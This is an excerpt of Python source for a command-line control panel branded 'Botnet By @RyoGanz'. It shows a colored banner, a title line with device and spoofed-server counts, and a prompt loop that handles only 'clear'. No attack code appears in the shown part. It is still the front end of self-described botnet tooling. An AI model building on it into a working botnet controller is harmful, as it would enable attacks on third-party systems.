...
\033[35m                ╔═══════════════════════════════════════════════╗
\033[35m                ║\033[32m- - - - - - - Botnet By \033[36m@RyoGanz  \033[35m- - - - - - -║
\033[35m                ║\033[32m - - - Type \033[36mmethod\033[35m to see the Help Menu - - - -║
\033[35m                ╚═══════════════════════════════════════════════╝
...
def main():
	...
	while True:
		...
		sys.stdout.write("\x1b]2;iRyo-Botnet. | Devices: [{}] | Spoofed Servers [19] | Server Units [8] | Clients: [18]\x07".format (bots))
		sin = input("\033[32m[\033[35m{}\033[32m@Botnet]\033[36m$ \033[96m".format(nicknm)).lower()
		sinput = sin.split(" ")[0]
		if sinput == "clear":
			os.system ("clear")
			print (banner)
